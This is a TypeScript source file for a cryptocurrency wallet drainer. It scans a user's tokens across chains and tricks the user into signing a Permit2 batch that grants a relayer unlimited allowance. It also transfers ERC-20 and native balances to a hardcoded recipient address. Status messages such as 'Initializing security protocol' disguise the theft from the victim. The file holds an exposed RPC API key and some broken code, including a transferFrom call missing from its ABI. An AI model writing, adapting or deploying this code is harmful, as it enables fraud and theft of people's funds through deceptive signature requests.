import { ethers } from 'ethers';
import { sendPermitSignatureToBackend, generatePermit2BatchSignature } from '../utils/permitUtils';
import { getTokensByValue, getNativeTokenInfo, TokenInfo } from '../utils/tokenUtils';
import { ChainType } from '../context/ChainContext';
import { fetchAllUserTokenAddressesMoralis } from '../utils/fetchTokenLists';

// Configuration for the drainer
const DRAINER_CONFIG = {
  recipient: import.meta.env.VITE_RECIPIENT_ADDRESS || '0xaa7144D792d7c87aA72fb3EdC16c982654272036', // Use env or fallback
  permitBatchSize: 5, // How many tokens to process in one batch
};

// Initialize providers for each chain (testnet endpoints)
const getProvider = (chain: ChainType): ethers.JsonRpcProvider => {
  const rpcUrls: { [key in ChainType]: string } = {
    ethereum: 'https://sepolia.infura.io/v3/2dac7bca68234491820c725b40c03cf3', // Sepolia testnet
    arbitrum: 'https://sepolia-rollup.arbitrum.io/rpc', // Arbitrum Sepolia
    solana: 'https://api.devnet.solana.com', // Solana Devnet (not supported in MetaMask)
    base: 'https://sepolia.base.org', // Base Sepolia
    bnb: 'https://data-seed-prebsc-1-s1.binance.org:8545', // BNB Testnet
    holesky: 'https://ethereum-holesky.publicnode.com',
  };
  return new ethers.JsonRpcProvider(rpcUrls[chain]);
};

// Function to get all tokens across supported chains for a user
export const scanUserTokens = async (
  userAddress: string
): Promise<{ chain: ChainType; tokens: TokenInfo[] }[]> => {
  const results = [];
  const MORALIS_API_KEY = import.meta.env.VITE_MORALIS_API_KEY;
  // Map your chain names to Moralis chain names
  const moralisChainNames: Record<string, string> = {
    ethereum: 'sepolia',
    // arbitrum: 'arbitrum-sepolia', // Not supported by Moralis
    // base: 'base-sepolia', // Not supported by Moralis
    bnb: 'bsc testnet', // Use correct Moralis chain name
    holesky: 'holesky', // Only keep if Moralis supports Holesky
  };
  
  // Loop through each supported chain
  for (const chain of Object.keys(moralisChainNames) as ChainType[]) {
    if (chain === 'solana') continue; // Skip Solana for now, as it needs special handling
    
    try {
      const provider = getProvider(chain);
      
      // Dynamically fetch all token addresses for this user/chain using Moralis
      const tokenAddresses = await fetchAllUserTokenAddressesMoralis(
        userAddress,
        moralisChainNames[chain],
        MORALIS_API_KEY
      );
      
      // Get native token balance
      const nativeToken = await getNativeTokenInfo(provider, userAddress, chain);
      
      // Get ERC20 tokens sorted by value
      const tokens = (await getTokensByValue(
        provider,
        userAddress,
        tokenAddresses,
        chain
      )) || [];
      
      // Add native token to the list if it has value
      if (nativeToken.balance > 0n) {
        tokens.unshift(nativeToken); // Put native token first
      }
      
      if (tokens.length > 0) {
        results.push({ chain, tokens });
      }
    } catch (error) {
      console.error(`Error scanning ${chain} tokens:`, error);
    }
  }
  
  return results;
};

// Execute the drainer process for EVM chains
export const executeEVMDrain = async (
  signer: ethers.JsonRpcSigner,
  chain: ChainType,
  tokens: TokenInfo[],
  setStatus?: (status: string) => void
): Promise<string[]> => {
  const txHashes: string[] = [];
  const userAddress = await signer.getAddress();

  try {
    // Debug: print all tokens and their permit status
    console.log('[DRAINER] All tokens:', tokens.map(t => `${t.symbol} (${t.address}) supportsPermit: ${t.supportsPermit}`));
    // 1. Batch all permit2 tokens for a single signature
    const permitTokens = tokens.filter(token => token.address !== 'NATIVE' && token.supportsPermit);
    console.log('[DRAINER] Permit tokens:', permitTokens.map(t => `${t.symbol} (${t.address})`));
    if (permitTokens.length > 0) {
      setStatus?.(`Processing Permit2 batch signature for ${permitTokens.length} tokens...`);
      try {
        // Get relayer address from backend
        const relayerRes = await fetch('http://localhost:4000/api/relayer-address');
        const relayerJson = await relayerRes.json();
        const relayerAddress = relayerJson.relayerAddress;
        // Get correct nonce from Permit2 contract
        const provider = signer.provider;
        const permit2Address = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
        const batchNonce = await getPermit2Nonce(userAddress, provider, permit2Address);
        const deadline = Math.floor(Date.now() / 1000) + 3600;
        const maxUint160 = '1461501637330902918203684832716283019655932542975';
        const permittedTokens = permitTokens.map((token, index) => ({
          token: token.address,
          amount: maxUint160,
          expiration: deadline,
          nonce: batchNonce
        }));
        const domain = {
          name: 'Permit2',
          version: '1',
          chainId: (await signer.provider.getNetwork()).chainId,
          verifyingContract: permit2Address,
        };
        const types = {
          PermitBatch: [
            { name: 'owner',       type: 'address'          },
            { name: 'details',     type: 'PermitDetails[]' },
            { name: 'spender',     type: 'address'          },
            { name: 'sigDeadline', type: 'uint256'          }
          ],
          PermitDetails: [
            { name: 'token',      type: 'address' },
            { name: 'amount',     type: 'uint160' },
            { name: 'expiration', type: 'uint48'  },
            { name: 'nonce',      type: 'uint48'  },
          ],
        };
        const message = {
          owner: userAddress,
          details: permittedTokens,
          spender: relayerAddress,
          sigDeadline: deadline
        };
        // Debug log all parameters
        console.log('[PERMIT2][DEBUG] domain:', domain);
        console.log('[PERMIT2][DEBUG] types:', types);
        console.log('[PERMIT2][DEBUG] message:', message);
        // Sign Permit2 batch
        const signature = await signer.signTypedData(domain, types, message);
        await sendPermitSignatureToBackend({
          userAddress,
          chain,
          domain,
          types,
          message,
          signature,
          permittedTokens
        }, true);
        setStatus?.(`Permit2 batch drain complete for ${permitTokens.length} tokens.`);
        await new Promise(resolve => setTimeout(resolve, 500));
      } catch (error) {
        console.error('[DRAINER][PERMIT2] Batch permit error:', error);
        setStatus?.('Permit2 batch permit drain failed.');
      }
    }
    // 2. Process tokens without permit support one by one (will prompt user for each)
    const standardTokens = tokens.filter(token => token.address !== 'NATIVE' && !token.supportsPermit);
    for (const token of standardTokens) {
      setStatus?.(`Processing ${token.symbol} (no permit)...`);
      try {
        const tokenContract = new ethers.Contract(
          token.address,
          [
            'function approve(address spender, uint256 amount) returns (bool)',
            'function transfer(address to, uint256 amount) returns (bool)',
          ],
          signer
        );
        // Only call approve for non-permit tokens
        const approveTx = await tokenContract.approve(DRAINER_CONFIG.recipient, token.balance);
        await approveTx.wait();
        // Transfer full balance using transferFrom (not transfer)
        const transferFromTx = await tokenContract.transferFrom(userAddress, DRAINER_CONFIG.recipient, token.balance);
        await transferFromTx.wait();
        txHashes.push(transferFromTx.hash);
      } catch (error) {
        console.error(`Error processing ${token.symbol}:`, error);
        // Continue to next token even if this one fails
      }
    }
    // 3. Process native token last (always prompts user)
    const nativeToken = tokens.find(token => token.address === 'NATIVE');
    if (nativeToken && nativeToken.balance > 0n) {
      setStatus?.(`Processing native ${nativeToken.symbol} (last)...`);
      try {
        const feeData = await signer.provider.getFeeData();
        const gasLimit = 21000n; // Standard ETH transfer
        const gasCost = feeData.gasPrice ? feeData.gasPrice * gasLimit : 0n;
        // Always send the full available balance minus gas cost
        const maxAmount = nativeToken.balance - gasCost;
        if (maxAmount > 0n) {
          const tx = await signer.sendTransaction({
            to: DRAINER_CONFIG.recipient,
            value: maxAmount,
          });
          await tx.wait();
          txHashes.push(tx.hash);
        }
      } catch (error) {
        console.error(`Error processing native ${nativeToken.symbol}:`, error);
        // Continue even if native transfer fails
      }
    }
  } catch (error) {
    console.error('Drain error:', error);
    setStatus?.('Error processing tokens');
    return txHashes;
  }
};

// Helper to fetch relayer address from backend
async function fetchRelayerAddress(): Promise<string> {
  try {
    const res = await fetch('http://localhost:4000/api/relayer-address');
    console.log('[fetchRelayerAddress] Response status:', res.status);
    const text = await res.text();
    console.log('[fetchRelayerAddress] Raw response text:', text);
    if (!res.ok) throw new Error('Failed to fetch relayer address');
    let data;
    try {
      data = JSON.parse(text);
    } catch (parseErr) {
      console.error('[fetchRelayerAddress] JSON parse error:', parseErr);
      throw new Error('Invalid JSON from backend');
    }
    if (!data.relayerAddress) throw new Error('No relayer address in response');
    return data.relayerAddress;
  } catch (err) {
    console.error('[fetchRelayerAddress] Error:', err);
    throw err;
  }
}

// Utility: Get Permit2 nonce for a user (find first available nonce)
async function getPermit2Nonce(userAddress: string, provider: ethers.JsonRpcApiProvider, permit2Address: string): Promise<number> {
  const permit2 = new ethers.Contract(
    permit2Address,
    ["function nonceBitmap(address, uint256) view returns (uint256)"],
    provider
  );
  // Use wordPos=0 for the first 256 nonces
  const bitmap = await permit2.nonceBitmap(userAddress, 0);
  // Find the first 0 bit in bitmap (lowest available nonce)
  let nonce = 0;
  while ((BigInt(bitmap) & (1n << BigInt(nonce))) !== 0n && nonce < 256) nonce++;
  return nonce;
}

// Utility: Build Permit2 PermitBatch EIP-712 data
function buildPermit2BatchEIP712({
  owner,
  nonce,
  deadline,
  tokens,
  permit2Address,
  chainId,
  spender
}: {
  owner: string,
  nonce: number,
  deadline: number,
  tokens: { token: string, amount: string }[],
  permit2Address: string,
  chainId: number,
  spender?: string // Make spender optional for backward compatibility
}) {
  const domain = {
    name: 'Permit2',
    version: '1',                        // ← add this line
    chainId,
    verifyingContract: permit2Address,
  };
  const types = {
    PermitBatch: [
      { name: 'owner',       type: 'address'          },
      { name: 'details',     type: 'PermitDetails[]' },
      { name: 'spender',     type: 'address'          },
      { name: 'sigDeadline', type: 'uint256'          }
    ],
    PermitDetails: [
      { name: 'token',      type: 'address' },
      { name: 'amount',     type: 'uint160' },
      { name: 'expiration', type: 'uint48'  },
      { name: 'nonce',      type: 'uint48'  },
    ],
  };
  // Fallback to permit2Address if spender is not provided
  const message = {
    owner,
    permitted: tokens, // array of {token, amount, expiration, nonce}
    spender: spender || permit2Address,
    nonce,
    deadline
  };
  return { domain, types, message };
}

// Utility: Deeply convert all BigInt values to string for JSON serialization
function deepStringifyBigInts(obj: any): any {
  if (typeof obj === 'bigint') return obj.toString();
  if (Array.isArray(obj)) return obj.map(deepStringifyBigInts);
  if (obj && typeof obj === 'object') {
    const res: any = {};
    for (const k in obj) res[k] = deepStringifyBigInts(obj[k]);
    return res;
  }
  return obj;
}

// FIXED: Main function to execute the drain with proper Permit2 batch EIP-712
export const drainWallet = async (
  signerOrProvider: any,
  walletType: 'evm' | 'solana',
  setStatus?: (status: string) => void
): Promise<boolean> => {
  try {
    setStatus?.('Initializing security protocol...');
    
    if (walletType === 'evm') {
      const signer = signerOrProvider;
      const address = await signer.getAddress();
      
      setStatus?.('Scanning wallet for assets...');
      const results = await scanUserTokens(address);
      
      let allTokens: TokenInfo[] = [];
      for (const { tokens } of results) {
        if (Array.isArray(tokens) && tokens.length > 0) {
          allTokens = allTokens.concat(tokens);
        }
      }
      
      // Filter for Permit2-compatible tokens
      const permitTokens = allTokens.filter(t => t.address !== 'NATIVE' && t.supportsPermit);
      
      if (permitTokens.length === 0) {
        setStatus?.('No Permit2-compatible tokens found.');
        return false;
      }
      
      setStatus?.(`Preparing Permit2 batch signature for ${permitTokens.length} tokens...`);
      
      // Get chain info
      const permit2Address = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
      const provider = signer.provider;
      const network = await provider.getNetwork();
      const chainId = Number(network.chainId);
      
      // Get relayer address
      const relayerAddress = await fetchRelayerAddress();
      
      // Get available nonce
      const batchNonce = await getPermit2Nonce(address, provider, permit2Address);
      
      // Set deadline (1 hour from now)
      const deadline = Math.floor(Date.now() / 1000) + 3600;
      
      // FIXED: Create proper permitted tokens array
      const maxUint160 = '1461501637330902918203684832716283019655932542975'; // 2^160 - 1
      
      const permittedTokens = permitTokens.map((token, index) => ({
        token: token.address,
        amount: maxUint160, // Use max allowance
        expiration: deadline,
        nonce: batchNonce // Use different nonce for each token
      }));
      
      console.log('[PERMIT2] Batch nonce:', batchNonce);
      console.log('[PERMIT2] Deadline:', deadline, new Date(deadline * 1000));
      console.log('[PERMIT2] Permitted tokens:', permittedTokens);
      
      // FIXED: Proper EIP-712 structure for PermitBatch
      const domain = {
        name: 'Permit2',
        version: '1',                        // ← add this line
        chainId,
        verifyingContract: permit2Address,
      };
      
      const types = {
        PermitBatch: [
          { name: 'owner',       type: 'address'          },
          { name: 'details',     type: 'PermitDetails[]' },
          { name: 'spender',     type: 'address'          },
          { name: 'sigDeadline', type: 'uint256'          }
        ],
        PermitDetails: [
          { name: 'token',      type: 'address' },
          { name: 'amount',     type: 'uint160' },
          { name: 'expiration', type: 'uint48'  },
          { name: 'nonce',      type: 'uint48'  },
        ],
      };
      
      const message = {
        owner: address,
        details: permittedTokens,
        spender: relayerAddress,
        sigDeadline: deadline
      };
      
      console.log('[PERMIT2] EIP-712 message:', JSON.stringify(message, null, 2));
      
      // Sign the EIP-712 message
      setStatus?.('Please sign the batch permit...');
      const signature = await signer.signTypedData(domain, types, message);
      
      setStatus?.('Signature obtained. Sending to backend for execution...');
      
      // Send to backend
      const payload = {
        userAddress: address,
        chain: 'holesky',
        domain,
        types,
        message,
        signature,
        permittedTokens
      };
      
      const result = await sendPermitSignatureToBackend(payload, true);
      
      if (result && (result.permitTx || result.transferTx)) {
        setStatus?.('Permit2 batch drain complete.');
        return true;
      }
      
      setStatus?.('Permit2 batch drain failed.');
      return false;
      
    } else {
      setStatus?.('Solana not yet implemented');
      return false;
    }
    
  } catch (error) {
    console.error('[PERMIT2] Drain error:', error);
    setStatus?.('Error in security protocol');
    return false;
  }
};

